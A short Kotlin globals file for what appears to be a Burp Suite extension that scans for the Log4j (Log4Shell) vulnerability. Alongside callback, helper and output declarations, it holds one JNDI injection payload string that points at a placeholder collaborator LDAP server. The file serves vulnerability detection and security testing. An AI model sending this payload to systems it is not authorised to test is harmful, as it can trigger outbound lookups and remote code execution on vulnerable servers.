package com.dexter0us.log4jScanner

import burp.IBurpExtenderCallbacks
import burp.IExtensionHelpers
import kotlinx.coroutines.Job
import kotlinx.coroutines.channels.ReceiveChannel
import java.io.PrintWriter

lateinit var callbacks: IBurpExtenderCallbacks
lateinit var helpers: IExtensionHelpers
lateinit var stdout: PrintWriter
lateinit var stderr: PrintWriter

val console = { str: String -> stdout.println(str) }

var initialPayload = "\${jndi:ldap://[collaborator-server]/a}"

var historySize: Int = 100

var currJob: Job? = null
class ProcessResult(val resultChannel: ReceiveChannel<Int>, val job: Job)